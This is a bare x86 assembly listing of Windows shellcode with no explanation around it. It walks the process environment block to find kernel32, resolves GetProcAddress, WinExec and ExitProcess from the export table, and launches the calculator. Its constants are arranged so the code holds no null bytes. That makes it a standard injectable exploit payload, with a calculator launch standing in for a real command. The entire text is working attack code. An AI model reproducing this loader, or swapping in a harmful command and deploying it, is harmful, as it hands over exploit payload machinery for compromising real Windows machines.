xor ecx,ecx
mov ecx, 0xffffffff ;Anti NullByte
sub ecx, 0xffffffcf
mov eax,[fs:ecx]
xor ecx,ecx
mov eax,[eax+0xc]
mov esi,[eax+0x14]
lodsd
xchg eax,esi
lodsd
mov ebx,[eax+0x10]
mov edx,[ebx+0x3c]
add edx,ebx
mov edx,[edx+0x78]
add edx,ebx
mov esi,[edx+0x20]
add esi,ebx
xor ecx,ecx
Loop:
inc ecx
lodsd
add eax,ebx
cmp dword [eax],0x50746547
jnz Loop
cmp dword [eax+0x4],0x41636f72
jnz Loop
cmp dword [eax+0x8],0x65726464
jnz Loop
mov esi,[edx+0x24]
add esi,ebx
mov cx,[esi+ecx*2]
dec ecx
mov esi,[edx+0x1c]
add esi,ebx
mov edx,[esi+ecx*4]
add edx,ebx
xor esi,esi
push edx
pop esi
xor edi,edi
push ebx
pop edi
xor ecx,ecx
push ecx
mov ecx, 0xffffffff
sub ecx, 0xff9c9a87
push ecx
xor ecx,ecx
push 0x456e6957
mov ecx,esp
push ecx
push ebx
call edx
xor ecx,ecx
push ecx
mov ecx, 0xffffffff
sub ecx, 0xff8c8c9a
push ecx
xor ecx,ecx
push 0x636f7250
push 0x74697845
mov ecx,esp
push ecx
push edi
xor edi,edi
mov edi,eax
call esi
xor esi,esi
push eax
pop esi
xor ecx,ecx
push ecx
push 0x636c6163 ; clac
mov ecx,esp
xor ebx,ebx
mov ebx, 0xffffffff
sub ebx, 0xffffffff
push ebx
xor ebx,ebx
push ecx
call edi